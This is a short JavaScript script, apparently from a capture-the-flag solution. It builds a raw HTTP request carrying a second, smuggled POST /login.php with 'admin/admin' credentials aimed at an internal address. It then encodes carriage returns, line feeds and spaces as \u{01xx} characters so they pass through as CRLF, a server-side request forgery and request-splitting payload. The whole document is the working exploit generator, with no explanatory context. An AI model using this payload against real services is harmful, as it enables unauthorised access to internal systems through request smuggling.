payload = "username=admin&password=admin"


httpRaw = `http://172.18.0.2/ HTTP1.1
Host: 172.18.0.2
Connection: keep-alive

POST /login.php HTTP/1.1
Content-Length: ${payload.length}

${payload}

GET /`

httpRawlist = httpRaw.replaceAll('\n','\r\n').split("")
httpNewlist = []

for(let i=0;i<=httpRawlist.length;i++){
        if(httpRawlist[i] == '\r' || httpRawlist[i] == '\n' || httpRawlist[i] == ' '){
                tmp = "\\u{01" + httpRawlist[i].charCodeAt().toString(16).padStart(2,'0') + "}" 
        }else{
                tmp = httpRawlist[i]
        }
        httpNewlist.push(tmp)
}

console.log(httpNewlist.join(""))
